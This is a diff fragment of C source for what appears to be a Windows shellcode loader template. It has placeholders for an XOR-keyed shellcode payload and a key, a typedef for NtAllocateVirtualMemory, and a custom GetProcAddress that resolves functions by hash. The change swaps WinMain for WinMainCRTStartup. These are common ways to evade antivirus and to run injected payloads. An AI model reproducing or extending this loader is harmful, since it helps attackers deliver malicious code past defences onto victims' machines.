@@ -1,6 +1,5 @@
 #include "config.h"
 
-
 typedef NTSYSAPI NTSTATUS (NTAPI* NtAllocVirtMem)(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
@@ -182,9 +181,7 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
     return function_base;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-    LPSTR lpCmdLine, int nCmdShow) {
-    
+int WinMainCRTStartup() {
     unsigned char payload[] = "%SHELLCODE%";
     SIZE_T regionSize = sizeof(payload);
     WORD key = %XOR_KEY%;
